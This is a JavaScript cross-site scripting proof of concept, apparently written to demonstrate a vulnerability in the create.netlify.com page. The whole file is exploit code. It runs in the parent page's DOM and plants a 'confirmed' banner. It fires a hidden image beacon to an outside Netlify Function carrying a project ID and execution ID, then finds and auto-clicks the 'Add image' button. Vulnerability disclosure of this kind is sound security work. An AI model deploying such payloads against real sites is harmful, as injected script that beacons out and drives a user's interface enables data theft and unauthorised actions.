(() => {
  const doc = parent.document;
  const root = doc.documentElement;
  root.setAttribute('data-create-custom-xss', 'confirmed');

  if (!doc.getElementById('create-custom-xss-proof')) {
    const marker = doc.createElement('div');
    marker.id = 'create-custom-xss-proof';
    marker.textContent = 'XSS #1 CONFIRMED: custom control executed in the parent create.netlify.com page';
    Object.assign(marker.style, {
      position: 'fixed', top: '12px', left: '50%', transform: 'translateX(-50%)',
      zIndex: '2147483647', padding: '12px 18px', border: '3px solid #0a0',
      borderRadius: '8px', background: '#fff', color: '#070', font: '700 16px system-ui'
    });
    doc.body.appendChild(marker);
  }

  // Create a harmless, fixed-data image marker in the top-level Create DOM.
  // Its Netlify Function stores only execution time, a random run ID, and the
  // already-public owned project ID so page-load execution can be verified
  // without browser automation or retaining any account/session data.
  if (!doc.getElementById('create-page-load-xss-proof-beacon')) {
    const beacon = doc.createElement('img');
    beacon.id = 'create-page-load-xss-proof-beacon';
    beacon.alt = '';
    beacon.width = 1;
    beacon.height = 1;
    beacon.hidden = true;
    const executionId = parent.crypto.randomUUID();
    beacon.src =
      'https://warm-semifreddo-a04774.netlify.app/.netlify/functions/xss-page-load-proof' +
      '?mode=mark&projectId=6acf9e083b59db6429ab7e8d&executionId=' +
      encodeURIComponent(executionId);
    doc.body.appendChild(beacon);
    root.setAttribute('data-create-page-load-execution-id', executionId);
  }

  let tries = 0;
  const timer = parent.setInterval(() => {
    const addImage = [...doc.querySelectorAll('button')].find((button) =>
      /^add image$/i.test((button.innerText || button.textContent || '').trim())
    );
    if (addImage) {
      parent.clearInterval(timer);
      root.setAttribute('data-create-asset-autotrigger', 'clicked');
      addImage.click();
    } else if (++tries >= 80) {
      parent.clearInterval(timer);
      root.setAttribute('data-create-asset-autotrigger', 'button-not-found');
    }
  }, 250);
})();
